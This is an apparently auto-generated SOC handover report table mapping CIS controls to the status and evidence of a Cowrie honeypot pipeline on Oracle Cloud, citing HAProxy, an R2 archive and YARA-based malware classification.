| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-10T22:43:13Z_
